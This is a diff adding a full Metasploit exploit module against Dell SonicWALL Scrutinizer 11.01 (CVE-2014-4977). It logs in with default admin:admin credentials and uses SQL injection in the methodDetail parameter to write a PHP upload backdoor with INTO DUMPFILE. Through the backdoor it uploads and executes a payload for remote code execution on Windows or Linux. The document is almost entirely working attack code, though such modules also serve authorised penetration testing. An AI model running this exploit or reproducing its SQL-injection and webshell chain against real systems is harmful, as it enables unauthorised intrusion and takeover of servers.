@@ -1,0 +1,401 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::FileDropper
+  include Msf::Exploit::EXE
+
+  WINDOWS = /^win/i
+  LINUX   = /linux/i
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Dell SonicWALL Scrutinizer 11.01 methodDetail SQL Injection",
+      'Description'    => %q{
+        This module exploits a vulnerability found in Dell SonicWALL Scrutinizer. The methodDetail
+        parameter in exporters.php allows an attacker to write arbitrary files to the file system
+        with an SQL Injection attack, and gain remote code execution under the context of SYSTEM
+        for Windows, or as Apache for Linux.
+
+        Authentication is required to exploit this vulnerability, but this module uses
+        the default admin:admin credential.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'bperry', # Original discovery, PoC, and Metasploit module
+          'sinn3r'  # Metasploit module for native support
+        ],
+      'References'     =>
+        [
+          [ 'CVE', '2014-4977' ],
+          [ 'BID', '68495' ],
+          [ 'URL', 'http://seclists.org/fulldisclosure/2014/Jul/44' ],
+          [ 'URL','https://gist.github.com/brandonprry/76741d9a0d4f518fe297' ]
+        ],
+      'Arch'           => [ ARCH_X86 ],
+      'Platform'       => [ 'win', 'linux' ],
+      'Targets'        =>
+        [
+          [ 'Automatic', {} ],
+          [
+            'Dell SonicWALL Scrutinizer 11.01 on Windows',
+            {
+              'Arch'     => ARCH_X86,
+              'Platform' => 'win',
+            }
+          ],
+          [
+            'Dell SonicWALL Scrutinizer 11.01 Linux Appliance',
+            {
+              'Arch'     => ARCH_X86,
+              'Platform' => 'linux'
+            }
+          ]
+        ],
+      'Privileged'     => false,
+      'DisclosureDate' => 'Jul 24 2014',
+      'DefaultTarget'  => 0))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [ true, "Base Application path", "/" ]),
+        OptString.new('USERNAME', [ true,  'The username to authenticate as', 'admin' ]),
+        OptString.new('PASSWORD', [ true,  'The password to authenticate with', 'admin' ])
+      ], self.class)
+  end
+
+
+  # Prints a message with the target's IP and port.
+  #
+  # @param msg [String] Message to print.
+  # @return [void]
+  def print_status(msg='')
+    super("#{peer} - #{msg}")
+  end
+
+
+  # Prints an error message with the target's IP and port.
+  #
+  # @param msg [String] Message to print.
+  # @return [void]
+  def print_error(msg='')
+    super("#{peer} - #{msg}")
+  end
+
+
+  # Pads NULL columns for a SQL injection string.
+  #
+  # @param n [Fixnum] Number of nulls
+  # @return [String]
+  def pad_null(n)
+    padding = []
+
+    n.times do
+      padding << 'NULL'
+    end
+
+    padding * ','
+  end
+
+
+  # Checks (explicitly) the target for the vulnerability. To be able to check this, a
+  # valid username/password is required.
+  #
+  # @return [void]
+  def check
+    begin
+      res = do_login
+    rescue Msf::Exploit::Failed => e
+      vprint_error(e.message)
+      return Exploit::CheckCode::Unknown
+    end
+
+    uid = res['userid']
+    sid = res['sessionid']
+    pattern = Rex::Text.rand_text_alpha(10)
+    sqli_str = "-6045 UNION ALL SELECT '#{pattern}',#{pad_null(19)}"
+    res = do_sqli(sqli_str, sid, uid).get_json_document
+    return Exploit::CheckCode::Vulnerable if res['id'].to_s == pattern
+
+    Exploit::CheckCode::Safe
+  end
+
+
+  # Returns the OS information by using @@version_compile_os.
+  #
+  # @param sid [String] Session ID.
+  # @param uid [String] User ID.
+  # @return [String] The OS information.
+  def get_os(sid, uid)
+    sqli_str = "-6045 UNION ALL SELECT @@version_compile_os,#{pad_null(19)}"
+    res = do_sqli(sqli_str, sid, uid).get_json_document
+    res['id']
+  end
+
+
+  # Returns target's d4d directory path that will be used to upload our malicious files.
+  #
+  # @param os [String] OS information.
+  # @return [String]
+  def get_d4d_path(os)
+    case os
+    when WINDOWS
+      # On Windows, the full d4d path looks something like this:
+      # C:\Program Files\Scrutinizer\html\d4d
+      '../../html/d4d'
+    when LINUX
+      # On the Linux appliance, the d4d path looks exactly like this:
+      '/home/plixer/scrutinizer/html/d4d'
+    end
+  end
+
+
+  # Logs into Dell SonicWALL Scrutinizer.
+  #
+  # @return [Hash] JSON response.
+  def do_login
+    res = send_request_cgi({
+      'uri' => normalize_uri(target_uri, '/cgi-bin/login.cgi'),
+      'vars_get' => {
+        'name' => datastore['USERNAME'],
+        'pwd' => datastore['PASSWORD']
+      }
+    })
+
+    unless res
+      fail_with(Failure::Unknown, 'The connection timed out while attempting to log in.')
+    end
+
+    res = res.get_json_document
+
+    if res['noldapnouser']
+      fail_with(Failure::NoAccess, "Username '#{datastore['USERNAME']}' is incorrect.")
+    elsif res['loginfailed']
+      fail_with(Failure::NoAccess, "Password '#{datastore['PASSWORD']}' is incorrect.")
+    end
+
+    report_cred(datastore['USERNAME'], datastore['PASSWORD'])
+
+    res
+  end
+
+
+  # Saves a valid username/password to database.
+  #
+  # @param username [String]
+  # @param password [String]
+  # @return [void]
+  def report_cred(username, password)
+    service_data = {
+      address: rhost,
+      port: rport,
+      service_name: ssl ? 'https' : 'http',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      module_fullname: self.fullname,
+      origin_type: :service,
+      username: username,
+      private_data: password,
+      private_type: :password
+    }.merge(service_data)
+
+    credential_core = create_credential(credential_data)
+
+    login_data = {
+      core: credential_core,
+      last_attempted_at: DateTime.now,
+      status: Metasploit::Model::Login::Status::SUCCESSFUL
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
+
+  # Injects malicious SQL string to the methodDetail parameter against the target machine.
+  #
+  # @param method_detail [String] Malicious SQL injection string.
+  # @param sid [String] Session ID.
+  # @param uid [String] User ID.
+  # @return [Rex::Proto::Http::Response]
+  def do_sqli(method_detail, sid, uid)
+    res = send_request_cgi({
+      'uri'      => normalize_uri(target_uri, '/d4d/exporters.php'),
+      'vars_get' => { 'methodDetail'=> method_detail },
+      'cookie'   => "cookiesenabled=1;sessionid=#{sid};userid=#{uid}"
+    })
+
+    unless res
+      fail_with(Failure::Unknown, 'The connection timed out for exporters.php.')
+    end
+
+    res
+  end
+
+
+  # Returns a PHP backdoor that is to be uploaded onto the target machine.
+  #
+  # @param os [String] Target OS information.
+  # @param target_path [String]
+  # @return [String] PHP backdoor
+  def get_php_backdoor(os)
+    case os
+    when WINDOWS
+      chmod_code = %Q|chmod($bname, 0777);|
+      exec_code = %Q|exec($bname);|
+    when LINUX
+      chmod_code = %Q|chmod("./" . $bname, 0777);|
+      exec_code = %Q|exec("./" . $bname);|
+    end
+
+    %Q|<?php
+    $bname = basename( $_FILES['uploadedfile']['name']);
+    $target_path = "./" . $bname;
+    move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path);
+    #{chmod_code}
+    #{exec_code}
+    ?>
+    |.gsub(/\x20{4}/, ' ')
+  end
+
+
+  # Uploads the executable payload via malicious PHP backdoor.
+  #
+  # @param backdoor_fname [String] Name of the backdoor
+  # @param payload_fname [String] Name of the executable payload
+  # @return [void]
+  def upload_payload(backdoor_fname, payload_fname)
+    p = generate_payload_exe(
+      code: payload.encoded,
+      platform: @my_target.platform,
+      arch: @my_target.arch
+    )
+
+    print_status("Uploading #{payload_fname} (#{p.length} bytes)...")
+
+    post_data = Rex::MIME::Message.new
+    post_data.add_part(
+      p,
+      'application/octet-stream',
+      'binary',
+      "form-data; name=\"uploadedfile\"; filename=\"#{payload_fname}\""
+    )
+    data = post_data.to_s
+
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri'    => normalize_uri(target_uri, "/d4d/#{backdoor_fname}"),
+      'ctype'  => "multipart/form-data; boundary=#{post_data.bound}",
+      'data'   => data
+    })
+
+    unless res
+      # Here we are not using fail_with, because when we get a session, it seems to be creating
+      # the same effect as connection hanging... and then eventually times out. If that
+      # happens, a fail_with() can cause msfconsole to believe there is no session created.
+      vprint_status('Connection timed out while uploading payload.')
+      return
+    end
+
+    if res.code == 404
+      fail_with(Failure::Unknown, "Server returned 404 for #{backdoor_fname}.")
+    end
+  end
+
+
+  # Uploads the PHP backdoor onto the target machine. The reason of using a PHP backdoor to upload
+  # is because our SQL injection is in a GET method, and Apache has a max length of 8190 bytes,
+  # which is bad for some built-in or custom payloads.
+  #
+  # @param opts [Hash]
+  # @option opts [String] :d4d_path
+  # @option opts [String] :backdoor_fname
+  # @option opts [String] :payload_fname
+  # @option opts [String] :sid
+  # @option opts [String] :uid
+  # @option opts [String] :os
+  # @return [void]
+  def upload_php_backdoor(opts)
+    d4d_path       = opts[:d4d_path]
+    backdoor_fname = opts[:backdoor_fname]
+    payload_fname  = opts[:payload_fname]
+    sid            = opts[:sid]
+    uid            = opts[:uid]
+    os             = opts[:os]
+
+    print_status("Injecting a PHP upload backdoor (#{backdoor_fname})...")
+    hex_backdoor = get_php_backdoor(os).unpack("H*")[0]
+    sqli_str = "-6045 UNION ALL SELECT 0x#{hex_backdoor},#{pad_null(19)} INTO DUMPFILE '#{d4d_path}/#{backdoor_fname}' #"
+    do_sqli(sqli_str, sid, uid)
+  end
+
+
+  # Attempts a SQL injection attack against the target machine.
+  #
+  # @param os [String] OS information.
+  # @param sid [String] Session ID.
+  # @param uid [String] User ID.
+  # @return [void]
+  def do_backdoor_sqli(os, sid, uid)
+    backdoor_fname = "#{Rex::Text.rand_text_alpha(6)}.php"
+    payload_fname  = Rex::Text.rand_text_alpha(5)
+    payload_fname << '.exe' if @my_target['Platform'].match(WINDOWS)
+    d4d_path       = get_d4d_path(os)
+
+    register_files_for_cleanup(backdoor_fname, payload_fname)
+
+    opts = {
+      d4d_path: d4d_path,
+      backdoor_fname: backdoor_fname,
+      payload_fname: payload_fname,
+      sid: sid,
+      uid: uid,
+      os: os
+    }
+
+    upload_php_backdoor(opts)
+    upload_payload(backdoor_fname, payload_fname)
+  end
+
+
+  # Tries to set the target. If the user manually set one, then avoid automatic target.
+  #
+  # @param os [String] OS information.
+  # @return [void]
+  def try_set_target(os)
+    @my_target = target if target != targets[0]
+    case os
+    when WINDOWS
+      @my_target = targets[1]
+    when LINUX
+      @my_target = targets[2]
+    else
+      fail_with(Failure::NoTarget, 'Unsupported target')
+    end
+  end
+
+
+  # Exploits the target machine. To do this, first we must log into the system in order to obtain
+  # the user ID and session ID. After logging in, we can ask the vulnerable code to upload a
+  # malicious PHP backdoor, and then finally use that backdoor to upload and execute our payload.
+  def exploit
+    res = do_login
+    uid = res['userid']
+    sid = res['sessionid']
+    os = get_os(sid, uid)
+    print_status("Detected OS information: #{os}")
+    try_set_target(os)
+    do_backdoor_sqli(os, sid, uid)
+  end
+
+end
